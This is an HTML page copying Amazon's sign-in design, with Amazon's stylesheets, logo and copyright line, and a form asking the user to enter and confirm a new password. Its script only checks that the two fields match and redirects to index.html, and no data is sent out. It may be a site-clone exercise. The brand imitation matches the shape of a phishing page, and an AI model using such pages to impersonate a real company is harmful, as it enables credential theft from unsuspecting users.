
<!doctype html><html>
    <head>
    <meta charset="utf-8"/>
    <title dir="ltr">Amazon Sign-In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61Brdu0o6LL._RC|11Fd9tJOdtL.css,21y5jWQoUML.css,31Q3id-QR0L.css,31P8A7PnBZL.css_.css?AUIClients/AmazonUI#us.not-trident" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|419sIPk+mYL.css,41REwEK74kL.css_.css?AUIClients/AuthenticationPortalAssets" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11E08O3eXDL.css?AUIClients/CVFAssets" />
    </head>
      <body>
      <div id="a-page">
          <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-medium a-text-center">
      <a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
        <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
       </a>
      </div>
    <div id="authportal-center-section" class="a-section">
    <div id="authportal-main-section" class="a-section">
      <div class="a-section auth-pagelet-container">
       <div class="a-section a-spacing-base">
        <div class="a-section">
          <form name="signIn" method="post" novalidate action="" 
          class="auth-validate-form auth-real-time-validation a-spacing-none"> 
             <div class="a-section">
              <div class="a-box"><div class="a-box-inner a-padding-extra-large">
                <h1 class="a-spacing-small">
                  Sign-In
                </h1>            
                <div class="a-row a-spacing-base">

                    <div class="a-row a-spacing-base"><label for="ap_password" class="a-form-label">New Password</label>
                        <input type="password" maxlength="1024"  required id="ap_password" autocomplete="off" placeholder="At least 6 characters" name="password" tabindex="5" class="a-input-text a-form-normal a-span12 auth-required-field auth-require-fields-match auth-require-password-validation"/>
                        <div class="a-box a-alert-inline a-alert-inline-info auth-inlined-information-message a-spacing-top-mini"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
                            Passwords must be at least 6 characters.
                          </div></div></div>
                        
                        </div>
                        <div class="a-row a-spacing-base">
                        <label for="ap_password_check" class="a-form-label">Re-enter password</label>
                        <input type="password" maxlength="1024" required id="ap_password_check" autocomplete="off" name="passwordCheck" tabindex="6" class="a-input-text a-form-normal a-span12 auth-required-field auth-require-fields-match"/>
                        
                        </div></div>
                  

    
    </div>
    <div class="a-section">
    <span id="continue" class="a-button a-button-span12 a-button-primary">
    <span class="a-button-inner">
    <span id="continue-login2" class="a-button-text" aria-hidden="true">Continue</span>
    </span>
    </span>
      <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
        By continuing, you agree to Amazon's <a href="#">Privacy Notice</a>.
      </div>
    </div>
    
      </div>
      </div></div>
            </div>
          </form>
        </div>
     <div class="a-divider a-divider-break"><h5>New to Amazon?</h5></div>
              <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
                <span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" 
                  href="register.html" class="a-button-text" role="button">
                Create your Amazon account
              </a></span></span>
    </div>
      </div> </div></div>
     <div id="right-2">
            </div>
             <div class="a-section a-spacing-top-extra-large auth-footer">
    
      <div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
        <div class="a-section a-spacing-small a-text-center a-size-mini">
        <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener" href="">
            Conditions of Use
          </a>
          <span class="auth-footer-seperator"></span>
          <a class="a-link-normal" target="_blank" rel="noopener" href="">
            Privacy Notice
          </a>
          <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener" href="">
            Help
          </a>
          <span class="auth-footer-seperator"></span></div>
    <div class="a-section a-spacing-none a-text-center">
    <span class="a-size-mini a-color-secondary">
        Â© 1996-2020, Amazon.com, Inc. or its affiliates
      </span>
      
      </div>
      </div>
          </div>
            </div>

            <script>
              window.onload=function()
          {
          $(document).ready(function()
          {
             
            $("#continue-login2") .click(function(event)
          
          { 
            var password=$("#ap_password").val();
            var rePassword=$("#ap_password_check").val();
            if(password === rePassword)
            {
                location.replace("index.html")
            }
          })
        });
    }
              
                    
                    
                   
            </script>
    
      </body>
      </html>
